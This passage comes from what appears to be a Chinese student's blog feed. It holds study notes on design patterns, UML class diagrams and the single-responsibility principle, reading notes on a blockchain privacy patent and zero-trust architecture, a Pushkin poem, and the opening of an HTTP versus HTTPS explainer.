        <content type="html"><![CDATA[<h1 id="考试内容"><a href="#考试内容" class="headerlink" title="考试内容"></a>考试内容</h1><ol><li>面向对象</li></ol><ol start="2"><li>六大原则</li></ol><ul><li>单一职责原则</li><li>里氏替换原则</li><li>依赖倒置原则</li><li>接口隔离原则</li><li>迪米特法则</li><li>关闭原则</li></ul><ol start="3"><li>主讲了九个模式一个机制</li></ol><ul><li>策略</li><li>观察[主动or被动]</li><li>工厂，抽象工厂</li><li>装饰</li><li>建造</li><li>组合</li><li>外观</li><li>状态</li><li>适配</li><li>反射机制</li></ul><p><img src="http://files.shanqianche.cn/202113/%E9%AB%98%E8%BD%AF%E5%A4%8D%E8%AF%95%E6%9D%90%E6%96%99.jpg" alt="往年考试题"></p><h1 id="分数占比分析"><a href="#分数占比分析" class="headerlink" title="分数占比分析"></a>分数占比分析</h1><blockquote><p>概念:模式设计 = 六四开<br><font color="red">抓好概念，模式设计这些言之有理即可</font></p></blockquote><h1 id="复习记录"><a href="#复习记录" class="headerlink" title="复习记录"></a>复习记录</h1><h2 id="程序设计方法基础"><a href="#程序设计方法基础" class="headerlink" title="程序设计方法基础"></a>程序设计方法基础</h2><ol><li>传统分层</li></ol><p>划分方式： 物理/逻辑<br>层数：两/三层</p><ol start="2"><li>逻辑上的三层结构</li></ol><ul><li>显示层View/UI（User Interface)</li><li>业务逻辑层BLL（Business Logic Layer）</li><li>数据访问层DAL（Data Access Layer）</li></ul><ol start="3"><li>原则，目的，优点</li></ol><p>分层访问<strong>原则</strong>：不可跨层进行访问、当前层只处理该职责的业务<br><strong>目的</strong>：隔离/解耦合<br><strong>优点</strong>：可维护性/扩展性/性能/安全性/</p><h2 id="面向对象方法的引入"><a href="#面向对象方法的引入" class="headerlink" title="面向对象方法的引入"></a>面向对象方法的引入</h2><ol><li>推广原因</li></ol><p><strong>为了解决块间的同名变量冲突，就会在编程中进行封装（保护）的尝试</strong>，对封装的进一步发展就提出了对象的概念，并增加了类，类继承的概念。、</p><ol start="2"><li>那么如何度量派生继承是良好的呢？</li></ol><p><strong>存在问题</strong>：代码的重用性和可扩展性都大大提升了，但是也带来了强耦合</p><blockquote><p><font color="#FF726A">LSP</font>：Liskov Substitution Principle<br>里氏原则可度量继承关系的质量，是面向对象的重要基石，该原则使得软件的功能扩展成为可能。</p></blockquote><ul><li>向下兼容思想【高版本可以打开低版本，子类可以透明替代父类，反之则否】</li></ul><p>如何满足向下兼容，且可扩展？<br>功能模块的<strong>可修改性</strong>，即程序中函数的调用不是在编译的时候确定，而是在运行时刻被确定的。</p><p><img src="http://files.shanqianche.cn/202113/1609667788985.png" alt="虚函数"></p><p><em>c++的虚基类用在控制重复继承上，表示这个基类在实例化子类时只生成一个副本 java只能单继承，不存在重复继承</em></p><ol start="3"><li>面向对象的特性</li></ol><ul><li>抽象(Abstraction)</li><li>封装(Encapsulation)</li><li>继承派生(Inheritance)</li><li>多态(Polymorphism)</li><li>组合(Composition)</li></ul><ol start="4"><li>面向对象引入的目的</li></ol><ul><li>重用（Reuse：Inheritance &amp; composition）</li><li>统一接口（Unified interface）</li><li>适用变化（Adapt to Change of Request）</li></ul>]]></content>
      
      
      <categories>
          
          <category> exam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> exam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式复习-1</title>
      <link href="/2020/12/28/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%A4%8D%E4%B9%A0-1/"/>
      <url>/2020/12/28/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%A4%8D%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<h1 id="辅助工具学习"><a href="#辅助工具学习" class="headerlink" title="辅助工具学习"></a>辅助工具学习</h1><h2 id="UML类图"><a href="#UML类图" class="headerlink" title="UML类图"></a>UML类图</h2><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><p><a href="http://www.cleey.com/blog/single/id/873.html">源头</a></p><p><img src="http://files.shanqianche.cn/20201228/1609158745582.png" alt="栗子"></p><ol><li>车的类图结构为&lt;&gt;，表示车是一个抽象类； </li><li>它有两个继承类：小汽车和自行车；它们之间的关系为实现关系，使用 带空心箭头的虚线表示； </li><li>小汽车为与SUV之间也是继承关系，它们之间的关系为泛化关系，使用带空心箭头的实线表示； </li><li>小汽车与发动机之间是组合关系，使用带实心箭头的实线表示； </li><li>学生与班级之间是聚合关系，使用带空心箭头的实线表示； </li><li>学生与身份证之间为关联关系，使用一根实线表示； </li><li>学生上学需要用到自行车，与自行车是一种依赖关系，使用带箭头的虚线表示；</li></ol><h3 id="详细学习"><a href="#详细学习" class="headerlink" title="详细学习"></a>详细学习</h3><p> <strong>泛化关系(Generalization)</strong></p><blockquote><p>【泛化关系】：是一种继承关系，表示一般与特殊的关系，它指定了子类如何特化父类的所有特征和行为。</p></blockquote><p><em>继承关系为 is-a</em></p><p><img src="http://files.shanqianche.cn/20201228/1609159498467.png" alt="A继承自B"></p><pre><code>【代码体现】：表现为继承非抽象类</code></pre><p><strong>实现关系(Realization)</strong></p><blockquote><p>【实现关系】：是一种类与接口的关系，表示类是接口所有特征和行为的实现.</p></blockquote><p><img src="http://files.shanqianche.cn/20201228/1609159705360.png" alt="实现关系表现为继承抽象类"></p><pre><code>【代码体现】：表现为继承抽象类</code></pre><p><strong>聚合关系(Aggregation)</strong></p><blockquote><p>【聚合关系】：是整体与部分的关系，且部分可以离开整体而单独存在。如车和轮胎是整体和部分的关系，轮胎离开车仍然可以存在。</p></blockquote><p>  <em>聚合关系是关联关系的一种，是强的关联关系；关联和聚合在语法上无法区分，必须考察具体的逻辑关系。【箭头及指向】：带空心菱形的实心线，菱形指向整体</em></p><p>  <img src="http://files.shanqianche.cn/20201228/1609159862416.png" alt="表示A聚合到B上，或者说B由A组成"></p><p> <em>聚合关系用于表示实体对象之间的关系，表示整体由部分构成的语义；例如一个部门由多个员工组成；<br>与组合关系不同的是，整体和部分不是强依赖的，即使整体不存在了，部分仍然存在；例如， 部门撤销了，人员不会消失，他们依然存在</em></p><pre><code>【代码体现】：成员变量</code></pre><p><strong>组合关系(Composition)</strong></p><blockquote><p>【组合关系】：是整体与部分的关系，但部分不能离开整体而单独存在。如公司和部门是整体和部分的关系，没有公司就不存在部门。</p></blockquote><p><img src="http://files.shanqianche.cn/20201228/1609159977459.png" alt="A组成B，或者B由A组成">  </p><pre><code>【代码体现】：成员变量</code></pre><p><strong>关联关系(Association)</strong></p><blockquote><p>【关联关系】：是一种拥有的关系，它使一个类知道另一个类的属性和方法。</p></blockquote><p><em>老师与学生，丈夫与妻子关联可以是双向的，也可以是单向的。双向的关联可以有两个箭头或者没有箭头，单向的关联有一个箭头。</em></p><p><img src="http://files.shanqianche.cn/20201228/1609160265231.png" alt="【箭头及指向】：指向被拥有者"></p><p><img src="http://files.shanqianche.cn/20201228/1609160313507.png" alt="自身关联"></p><pre><code>【代码体现】：成员变量</code></pre><p><strong>依赖关系(Dependency)</strong></p><blockquote><p>【依赖关系】：是一种使用的关系，即一个类的实现需要另一个类的协助，所以要尽量不使用双向的互相依赖.</p></blockquote><p><img src="http://files.shanqianche.cn/20201228/1609160418902.png" alt="【箭头及指向】：指向被使用者"></p><p><em>与关联关系不同的是，它是一种临时性的关系，通常在运行期间产生，并且随着运行时的变化； 依赖关系也可能发生变化；</em></p><p><font color="red">依赖也有方向，双向依赖是一种非常糟糕的结构，我们总是应该保持单向依赖，杜绝双向依赖的产生；</font></p><pre><code>【代码表现】： 局部变量、方法的参数或者对静态方法的调用</code></pre><h3 id="疑惑与解答"><a href="#疑惑与解答" class="headerlink" title="疑惑与解答"></a>疑惑与解答</h3><blockquote><p>问题来了小汽车是车的实现，那么SUV本身也是小汽车的实现呀，为何这归为泛化？</p></blockquote><p><strong>答：</strong> 泛化关系表现为继承非抽象类,(可以查看上边实现关系与泛化关系的定义)</p><h1 id="设计模式之禅"><a href="#设计模式之禅" class="headerlink" title="设计模式之禅"></a>设计模式之禅</h1><p><a href="https://gitee.com/merlynr/img-store/blob/d1481813922e92a8e297194f2c8176aab822be66/resource/e-book/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%A6%85%EF%BC%88%E7%AC%AC2%E7%89%88%EF%BC%89.pdf">感谢秦小波大佬的开阔前路</a></p><h2 id="大旗不挥，谁敢冲锋——6大设计原则全新解读"><a href="#大旗不挥，谁敢冲锋——6大设计原则全新解读" class="headerlink" title="大旗不挥，谁敢冲锋——6大设计原则全新解读"></a>大旗不挥，谁敢冲锋——6大设计原则全新解读</h2><h3 id="单一职责原则Single-Responsibility-Principle–SRP"><a href="#单一职责原则Single-Responsibility-Principle–SRP" class="headerlink" title="单一职责原则Single Responsibility Principle–SRP"></a>单一职责原则Single Responsibility Principle–SRP</h3><blockquote><p>单一职责原则的定义是：应该<font color="red">有且仅有一个</font>原因引起类的变更</p></blockquote><p><strong>SRP</strong> :There should never be more than one reason for a class to change.</p><p>文中作者举了个打电话的例子，电话通话的时候有4个过程发生：拨号、通话、回应、挂机四步骤。</p><p><img src="http://files.shanqianche.cn/20201228/1609163346475.png" alt="电话类图"></p><p><img src="http://files.shanqianche.cn/20201228/1609163496643.png" alt="代码清单"></p><p>这是目前比较正常的做法，面向接口编程。作者认为这个接口接近<em>完美</em> 但是却没有SRP，一个接口或者类只有一个原因引起变化。细谈打电话这个栗子，打电话这个接口不只一个职责，作者将其 分为两个，一个是底层数据交互时的<strong>协议管理</strong>，另一个是<strong>数据传输</strong>。dial()和hangup()两个方法实现的是协议管理，分别负责通过协议拨号接通和挂机；chat()实现的是数据的传送。</p><p><img src="http://files.shanqianche.cn/20201228/1609163747222.png" alt="职责分明的电话类图"></p><p>于是根据SRP，实现了上图的设计。但是一个手机类要把ConnectionManager和DataTransfer组合在一块才能使用。<strong>组合</strong>是一种强耦合关系，你和我都有<strong>共同的生命期</strong>，这样的强耦合关系还不如使用接口实现的方式呢，而且还增加了类的复杂性，多了两个类。经过这样的思考后，我们再修改一下类图，如图。</p><p><img src="http://files.shanqianche.cn/20201228/1609164425134.png" alt="简洁清晰、职责分明的电话类图"></p><p>这个设计实现了一个类实现两个接口，把两个职责融合到一块。这个已经符合SRP，一个协议控制的责任，一个数据传输的协议，但是和我理解的不一样，为什么定义说的是类呢?，那么就需要重新理解了，<font color="red">什么是SRP呢？</font><br><font color="green">答:</font> 实现最小责任的面向接口编程。<font color="#86AECE">这里的接口只是因为我们现在编程的习惯将功能与接口相对应，所以我们也需要考虑类是否满足最小责任，甚至方法。。。</font>，这就需要我们将“责任”和“变化原因”纳入衡量接口或类的质量考量范畴了。</p><blockquote><p>与当前编程环境相结合：</p><ol><li>不可强行SRP，这样就会是很多功能被强行拆分，然后使用时通过大量聚合和组合耦合在一块，无疑增加了系统复杂性</li><li>国内各个公司普遍开发环境还是面向对象开发，即一个对象的所以动作，都抽象到一个接口中例如图1-1，但是我们已经尽可能的实现SRP，例如图1-2</li></ol></blockquote><p><img src="http://files.shanqianche.cn/20201228/1609166170558.png" alt="图1-1"></p><p><img src="http://files.shanqianche.cn/20201228/1609166184445.png" alt="图1-2"></p>]]></content>
      
      
      <categories>
          
          <category> exam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> exam </tag>
            
            <tag> design-model </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Block chain transaction privacy protection method and system</title>
      <link href="/2020/11/10/Block%20chain%20transaction%20privacy%20protection%20method%20and%20system/"/>
      <url>/2020/11/10/Block%20chain%20transaction%20privacy%20protection%20method%20and%20system/</url>
      
        <content type="html"><![CDATA[<p><a href="https://patents.google.com/patent/WO2019080933A1/zh">https://patents.google.com/patent/WO2019080933A1/zh</a></p><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ol><li>解决交易信息透明，造成隐私信息暴露</li><li>论文提出解决方案使用到了秘密共享方式，解决共谋问题</li><li>确保关键字安全性</li></ol><h4 id="预处理方法"><a href="#预处理方法" class="headerlink" title="预处理方法"></a>预处理方法</h4><ol><li>将层次属性加密与线性秘密共享相结合，提出了一种基于可搜索属性加密的区块链数据隐私保护控制方案，解决了传统区块链交易中的隐私暴露问题。</li><li>用户的访问控制由验证节点实现，避免了向区块链网络提交私钥和访问结构的安全风险。将私钥组件与区块链中用户节点的随机身份相关联可以解决共谋问题</li><li>授权用户可以通过可搜索的加密来快速搜索和监督交易信息。改进的算法确保了关键字的安全性。【算法应该看不懂】</li></ol><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><ol><li><p>提出基于椭圆曲线加密算法m的更有效的盲签名混合方案—该方案简单易用，通常适用于各种数字货币，【但它是集中式货币方案】。</p><blockquote><p>传统公钥密码体制（密钥长度一般为512bit）随着计算机运算速度的提升，已经有被破解的趋势了，同时RSA运算效率较低。利用曲线上的有理点组成的Abel群《TODO》及其上离散对数问题求解的困难性构成一些公钥密码体制，即密钥的每个bit都具有最高的安全强度，椭圆曲线密码体制中160bit长的密钥所展示的安全强度相当于RSA的1024bit</p></blockquote></li><li><p>使用盲签名之类《TODO》的混合加密技术—区块链隐私保护机制【增加了技术成本，并且第三方实施令牌处理不可避免地增加了额外的服务开销】</p></li><li><p>提出了一种改进的基于环的秘密交易方案《TODO》</p><blockquote><p>在该方案中，大量的环签名被放置在可链接的自发匿名组签名的多层中，其解决方案可以保护身份隐私和交易隐私。尽管环签名提供了强大的匿名性，但它具有三个限制：产生交易数据较多，需要更多的记录的存储空间、签名的大小与参与者数量成正比，因此传统每个事务做了限制，每个事务有四个输出、隐藏的数量增加了检查的难度，即，它不仅验证交易期间是否生成了秘密加密货币，而且还确定了特定时刻的额外数量。</p></blockquote></li></ol><h3 id="初步知识"><a href="#初步知识" class="headerlink" title="初步知识"></a>初步知识</h3><h4 id="Bilinear-Mapping"><a href="#Bilinear-Mapping" class="headerlink" title="Bilinear Mapping"></a>Bilinear Mapping</h4><blockquote><p>双线性映射</p><blockquote><p>群</p><ol><li>封闭性——如果a和b都属于G，则a+b也属于G。</li><li>结合律——对于G中的任意元素a、b和c，都有（a+b）+c=a+（b+c）成立。</li><li>单位元——G中存在元素e，对于G中任意元素a，都有a+e=e+a=a成立。</li><li>逆元——对于G中任意元素a，G中都存在元素a’，使得a+a’=a’+a=e成立。G就叫作一个群，记为（G，+）</li><li>在群中定义求幂运算为重复使用群中的运算，如a^4 =a+a+a+a。规定a^0 =e为单位元。如果一个群的所有元素都是a的幂a^k，则称这个群是一个==循环群 #00BCD4==，这里的k是整数。a也被称为这个群的生成元。</li></ol></blockquote></blockquote><p><img src="http://files.shanqianche.cn/20201223/1608734193371.png" alt="双线性映射"></p><p>设G1、G2都是阶为p的循环群，p是素数。如果映射e: G1 × G1 → G2 满足以下性质：</p><ol><li>双线性性。<br>对于任意a，b∈Z<sub>p</sub>和R，S∈G1，有e(R<sup>a</sup>, S<sup>b</sup>) = e(R, S)<sup>ab<sup>；</li><li>非退化性。<br>存在R，S∈G<sub>1</sub>，使得e(R, S) ≠ 1<sub>G2</sub>。这里1<sub>G2</sub>代表G2群的单位元；</li><li>可计算性。<br>存在有效的算法对任意的R，S∈G<sub>1</sub>，计算e(R, S)的值。<br>那么称<strong>e</strong>是一个<strong>双线性映射</strong>。</li></ol><h4 id="Determining-the-Bilinear-Diffie–"><a href="#Determining-the-Bilinear-Diffie–" class="headerlink" title="Determining the Bilinear Diffie–"></a>Determining the Bilinear Diffie–</h4><p>ellman Assumption (DBDH)</p><blockquote><p>确定双线性参数生产区的假设（DBDH）</p></blockquote><p>选择一个G1的生成器，设a,b,c,r属于（1，q-1）中任意质数，当g^a,g^b,g^c,g^r属于G1，e(g,g)<sup>abc</sup>和e(g,g)<sup>r</sup>属于G2,判断<strong>e(g,g)<sup>abc</sup>和e(g,g)<sup>r</sup>是否相等</strong></p><p><strong>判断条件：</strong><br>对于任意多项式概率时间算法的对手A，解决决策双线性Diffie-Hellman（DBDH）假设[i]的优势定义为</p><p><img src="http://files.shanqianche.cn/20201223/1608734247064.png" alt="DBDH判断条件"></p><p>如果确定的值Adv<sup>DBDH</sup><sub> A</sub>可忽略不计，则将建立决策双线性Diffie-Hellman假设。</p><h4 id="Lsss-Linear-Secret-Sharing-Scheme"><a href="#Lsss-Linear-Secret-Sharing-Scheme" class="headerlink" title="Lsss Linear Secret Sharing Scheme"></a>Lsss Linear Secret Sharing Scheme</h4><blockquote><p>Lsss线性秘密共享方案【是对密钥的管理策略】</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/95362628">有趣的栗子</a></p><p>在信息系统中使用的秘密共享，可以防止系统密钥的遗失、损坏和来自地方的攻击，减小秘密保存者的责任。在(t,n)秘密共享体制中，秘密分发者将一个秘密信息分成n个秘密份额，分发给n 个人，当需要恢复秘密信息时，任意少于t个的秘密保存者都得不到该秘密的任何信息。<br>现目前进行秘密共享的主流方案有基于访问控制树和秘密共享矩阵的。基于访问控制树进行秘密分享时，通过门限控制进行合理的多项式构造，最终将秘密分享给树的每一个子节点。</p><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><h4 id="系统模型"><a href="#系统模型" class="headerlink" title="系统模型"></a>系统模型</h4><blockquote><p>基于可搜索属性加密的区块链数据隐私访问控制系统模型如图</p></blockquote><p><img src="http://files.shanqianche.cn/20201223/1608734364209.png" alt="基于可搜索属性加密的区块链数据隐私访问控制系统模型"></p><blockquote><p>包含的四个实体</p></blockquote><p><img src="http://files.shanqianche.cn/20201223/1608734388573.png" alt="四个实体"></p><ol><li>数据所有者：首先进行初始化，生成索引密钥和陷门密钥，提取交易的关键词，然后使用索引密钥对索引进行加密，形成索引密文；其次，对陷门密钥进行加密以形成陷门密钥密文并共享数据。最后，使用安全签名算法对交易进行签名并加密，同时，数据所有者将索引关键字附加到交易密文的密文文件中。最重要的是，数据所有者可以是区块链上进行比特币交易的用户或矿工。</li><li>用户：注册系统生成与真实身份相对应的身份标识符RID和与用户属性相对应的私钥。另外，用户解密陷门密文并使用 用户密钥以生成陷门，然后发送区块链以请求交易密文。</li><li>验证节点：验证用户身份和权限的正确性，并在属性集合中计算用户的属性和私钥参数以及权限参数，以分发陷密钥密文，并将用户密钥UK分发给合法用户。</li><li>矿工节点：矿工节点在此期间广播所有交易信息，每个节点执行验证并在验证后加入区块链。计算并匹配数据所有者发送的陷门和索引，然后在匹配成功后将交易密文发送到数据使用方。</li></ol><h4 id="威胁模式"><a href="#威胁模式" class="headerlink" title="威胁模式"></a>威胁模式</h4><p><strong>前提：</strong> 只有“验证节点”是完全可信的，私钥能正常生成和分发给用户。大多数矿工节点半诚实【不破坏协议，根据规则可以推测用户信息】。此外，用户可能会合谋解密他们无法访问的数据。</p><h4 id="安全模型"><a href="#安全模型" class="headerlink" title="安全模型"></a>安全模型</h4><p><strong>安全模型是指对手与挑战者之间的博弈。</strong></p><ol><li>IND-CPA security model【Indistinguishability under chosen-plaintext attack】</li></ol><blockquote><p>选择明文攻击。可理解为攻击者拥有加密机的使用权限，可以加密自己想加密的任何明文。攻击目的：由明文和对应的密文来分析和推断加密算法的信息，主要是加密密钥。</p></blockquote><ul><li>初始化：挑战者A使用初始化算法生成公共参数和主密钥【重复使用的密钥，对称密钥】，并将主密钥发送给对手C。—-<em>每次通信只使用一次的密钥称为会话密钥（session key）。相对于会话密钥，重复使用的密钥称为主密钥（master key）。</em></li><li>第一步：对手C重复尝试一组属性S1-Sq，但是没有属性满足访问</li><li>挑战：对手C选择两条消息M0; M1并将它们发送给挑战者A。挑战者A选择0或者1，和加密的访问结构的消息M，并将密文发送给对手C</li><li>第二步：</li></ul><ol start="2"><li>IND-CKA security model</li></ol><blockquote><p>关键字攻击</p></blockquote><h3 id="具体结构即功能实现"><a href="#具体结构即功能实现" class="headerlink" title="具体结构即功能实现"></a>具体结构即功能实现</h3><h4 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h4><p>用户向系统提交注册申请，获取真实身份信息对应的身份RID和用户属性集，数据所有者（交易用户）进行注册获取密钥和身份标识。</p><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p><a href="https://blog.csdn.net/zhangwenjiezw886/article/details/51006774">双线性</a></p><ol><li>数据拥有者:：选择一个以质数为序的群G<sub>0</sub>,用元素g(单位元)生成群，在限制字段中选择N个元素(N为阶)，并使用系统属性形成系统属性集S，并根据属性之间的相关性来确定S中的属性。S被分为x个树，H<sub>i</sub>被设置为i个树的深度，H为树中最大深度；随机选择向量U=(U<sub>y</sub>)<sub>1=&lt;x=&lt;y</sub>和U’=(U’<sub>y’</sub>)<sub>1=&lt;x‘=&lt;y’</sub>，u<sub>y</sub>代表与y属性树相对应的public参数，数据所有者选择素数p的序列，并生成群G<sub>1</sub>,H<sub>1</sub>。数据拥有者选择两个随机数η(姨塔)，μ(谬)，然后计算生成公钥PK={g,g<sup>μ</sup>}和私钥SK=η代表陷门。</li><li>验证结点：Z<sup>*</sup><sub>p</sub>在有限域中用p-基元表达一组元素，从中选择两个大小不同的随机数α，β，验证结点通过计算PK={G<sub>0</sub>,g,g<sup>β</sup>,Y=e(g,g)<sup>α</sup>,U,U’}和MK={α，β}来定义一个双线性图e:G<sub>0</sub>xG<sub>0</sub>=G<sub>1</sub>。</li><li>交易生成和签名：交易用户A生成交易信息，通过钱包签名算法对自身身份进行加密，并使用钱包地址对应的私钥对其签名，然后发送给交易用户B。签名的算法如下()：</li></ol><p><img src="http://files.shanqianche.cn/20201223/1608734446144.png" alt="签名算法"></p><blockquote><p>Trans:交易信息、<br>δ A为用户自身加密后的信息即用于标识、<br>CT<sub>A</sub>（Ciphertext密文）私钥加密产生签名</p></blockquote><ol start="4"><li>产生索引：交易者从交易明文信息中提取关键字，并用索引密钥g<sup>μ</sup>和两个随机数字进行加密。</li><li>加密：Encrypt(M，TK，PK)[信息，非对称传输密钥，公钥]</li></ol>]]></content>
      
      
      <categories>
          
          <category> paper </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> paper </tag>
            
            <tag> block chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习D一天</title>
      <link href="/2020/11/10/%E5%AD%A6%E4%B9%A0D%E4%B8%80%E5%A4%A9/"/>
      <url>/2020/11/10/%E5%AD%A6%E4%B9%A0D%E4%B8%80%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Plane</p></blockquote><hr><ul><li><input checked="" disabled="" type="checkbox"> 提出信息安全理论项目初步计划</li><li><input checked="" disabled="" type="checkbox"> 14:00-16:00 读身份加密的材料</li><li><input checked="" disabled="" type="checkbox"> 16:10-17:20 完成医院系统项目日志集成</li></ul><p><em>- [ ]  18:50-20:50 数据库的系统学习</em></p><ul><li><input disabled="" type="checkbox"> 21:00-22:30 springmvc学习</li><li><input disabled="" type="checkbox"> 22:30-23:30 总结</li></ul><hr><h3 id="信息安全理论项目安排"><a href="#信息安全理论项目安排" class="headerlink" title="信息安全理论项目安排"></a>信息安全理论项目安排</h3><ol><li>李完成基本项目搭建及核心抓包功能实现</li><li>陈完成数据库表完成【先将需要的表构思一下发群里看一下】</li><li>邹完成规则及书写功能需求</li><li>郑和邹书写功能需求，及将规则写入后端</li><li>郑艺根据功能需求完成基本的框架搭建和样式</li></ol><h3 id="身份认证相关论文"><a href="#身份认证相关论文" class="headerlink" title="身份认证相关论文"></a>身份认证相关论文</h3><h4 id="A-Survey-of-Zero-Trust-Research"><a href="#A-Survey-of-Zero-Trust-Research" class="headerlink" title="A Survey of Zero Trust Research"></a>A Survey of Zero Trust Research</h4><p>@author 张宇 张妍【北京数字认证股份有限公司】</p><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><ol><li>“边界防护”</li></ol><ol start="2"><li>何为无边界趋势下的网络安全问题</li><li></li><li>何为基于网络位置的隐式信任</li><li>何为静态防御</li><li>了解“ Google基于零信任构建的BeyondCorp项目”</li><li>了解“提出了软件定义边界（software defined perimeter,SDP)网络安全模型”</li><li>计算机专业词汇</li></ol><ul><li><strong>策略引擎（Policy Engine）：</strong> 该组件负责最终决定是否授予指定访问主体对资源（访问客体）的访问权限。策略引擎使用企业安全策略以及来自外部源（例如IP黑名单，威胁情报服务）的输入作为“信任算法”的输入，以决定授予或拒绝对该资源的访问，策略引擎的核心作用是信任评估。</li><li><strong>策略管理器（Policy Administrator）：</strong> 组件负责建立客户端与资源之间的连接。它将生成客户端用于访问企业资源的任何身份验证令牌或凭据。它与策略引擎紧密相关并依赖于其决定最终允许或拒绝连接，策略管理器的核心作用是策略判定点，是零信任动态权限的判定组件。</li><li><strong>策略执行点（Policy Enforcement Point）：</strong> 这实际上是一个组件系统，负责开始，持续监控、并最终结束访问主体与访问客体之间的连接。策略执行点实际可分为两个不同的组件：客户端组件（如用户笔记本电脑上的agent）与资源端组件（如资源前控制访问的网关），策略执行点的核心作用是确保业务的安全访问。</li><li><ul><li><strong>持续诊断和缓解计划系统（CDM System）：</strong> 该系统收集关于企业系统当前状态的信息，并将更新应用到配置和软件组件中。企业CDM系统还提供给策略引擎关于系统访问请求的信息。</li></ul></li><li><ul><li><strong>行业合规系统（Industry Compliance System）：</strong> 该系统确保企业与当前政府管理的一致性。包括企业开发的所有策略规则来确保合规。</li></ul></li><li><ul><li><strong>威胁情报流（Threat Intelligence）：</strong> 该系统提供帮助策略引擎进行访问决策的信息。</li></ul></li><li><ul><li><strong>数据访问策略（Data Access Policy）：</strong> 数据访问策略是企业为企业资源创建的关于数据访问的属性、规则和策略的集合。策略规则集可以编码在策略引擎中或有PE动态生成。</li></ul></li><li><ul><li><strong>企业公钥基础设施（PKI）：</strong> 该系统负责生成和记录企业对资源、应用等发布的证书。既包括全局CA生态系统和联邦PKI。</li></ul></li><li><ul><li><strong>ID管理系统（ID Management）：</strong> 系统负责创建、保存和管理企业用户帐户和身份记录。系统中既含有必要的用户信息，也含有其他企业特征，比如角色、访问属性、或分配的系统。</li></ul></li><li><ul><li><strong>安全应急和事件管理系统（SIEM System）：</strong> 集合了系统日志、网络流量、资源权利和其他信息的企业系统为企业信息系统体佛那个安全态势的反馈。</li></ul></li></ul><ol start="8"><li>何为分配基于二元决策的策略</li><li>了解RADIUS协议</li><li>了解SSO方式认证</li></ol><h5 id="梳理"><a href="#梳理" class="headerlink" title="梳理"></a>梳理</h5><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>如何进行动态认证？如何有效进行动态认证？</p><p><a href="https://www.secrss.com/articles/14045">引用</a><br><a href="chrome-extension://gfbliohnnapiefjpjlpjnehglfpaknnc/pages/pdf_viewer.html?r=https://www.gartner.com/teamsiteanalytics/servePDF?g=/imagesrv/media-products/pdf/Qi-An-Xin/Qianxin-1-1XXWAXWM.pdf">引用</a></p><h3 id="对于数据库的详细学习"><a href="#对于数据库的详细学习" class="headerlink" title="对于数据库的详细学习"></a>对于数据库的详细学习</h3>]]></content>
      
      
      <categories>
          
          <category> daily report </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《囚徒》普希金</title>
      <link href="/2020/10/19/lesslessqiu-tu-greatergreater-pu-xi-jin/"/>
      <url>/2020/10/19/lesslessqiu-tu-greatergreater-pu-xi-jin/</url>
      
        <content type="html"><![CDATA[<p><strong>我坐在阴湿牢狱的铁栏后<br>一只在禁锢中成长的鹰雏<br>和我郁郁地做伴；<br>它扑着翅膀，<br>在铁窗下啄食着血腥的食物。<br>它啄食着，丢弃着，又望望窗外，<br>像是和我感到同样的烦恼。<br>它用眼神和叫声向我招呼，<br>像要说：“我们飞去吧，是时候了，<br>“我们原是自由的鸟儿，飞去吧——<br>飞到那乌云后面明媚的山峦，<br>飞到那里，到那蓝色的海角，<br>只有风在欢舞……还有我做伴……</strong></p>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study </tag>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详记HTTP向HTTPS进化</title>
      <link href="/2020/06/19/xiang-ji-http-yu-https-zhi-jian-de-qu-bie/"/>
      <url>/2020/06/19/xiang-ji-http-yu-https-zhi-jian-de-qu-bie/</url>
      
        <content type="html"><![CDATA[<p>老师这个是我自己学习的，同时我也上传过这篇文章到我的博客，如果您想要验证，可以在<a href="https://blog.zuishuailcq.xyz/">博客</a>中搜索ssl就可以查到这篇文章了</p><h1 id="两者表面的区别"><a href="#两者表面的区别" class="headerlink" title="两者表面的区别"></a>两者表面的区别</h1><ol><li>HTTP（Hypertext Transfer Protocol）是超文本传输协议，<font color=#DE6B6E>信息是明文</font>，HTTPSHypertext Transfer Protocol Secure则是既有安全性的SSL加密传输协议。基本可以理解为在HTTP的传输基础上加入SSL层来加密信息。两者请求和响应都是已相同的方式进行工作。</li><li>HTTP采用80端口连接，HTTPS采用443端口连接qi</li><li>HTTP与HTTPS<font color=#FAE05C>连接方式不同</font></li><li>HTTPS在连接中需要CA证书认证身份，一般需要money购买</li><li>HTTP连接是<font color=#DE6B6E>无状态的</font>，可以短连接也可以长连接，更加灵活；HTTPS协议是由<font 